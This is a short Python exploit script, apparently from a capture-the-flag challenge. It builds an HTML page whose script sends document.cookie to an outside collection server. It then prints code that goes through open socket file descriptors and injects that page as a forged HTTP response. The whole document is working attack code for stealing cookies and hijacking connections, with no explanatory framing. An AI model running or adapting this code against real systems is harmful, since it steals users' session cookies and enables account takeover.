# This script is inspired by potetisensei

URL = "https://en9i5fcxybxwa.x.pipedream.net/"  # Your server

payload = f"""
<!DOCTYPE html>
<html lang="en">
    <head></head>
    <body>
    <script>location.href='{URL}?s='+document.cookie</script>
    </body>
</html>
"""

print(
    f"""
import socket
for fd in range(100):
    try:
        sock = socket.fromfd(fd, socket.AF_INET, socket.SOCK_STREAM)
        sock.sendall(b'''HTTP/1.1 200 OK
Server: Tsukushi/2.94
Content-Length: {len(payload)}
Content-Type: text/html
Connection: Closed

{payload}''')
    except Exception as e:
        pass
"""
)
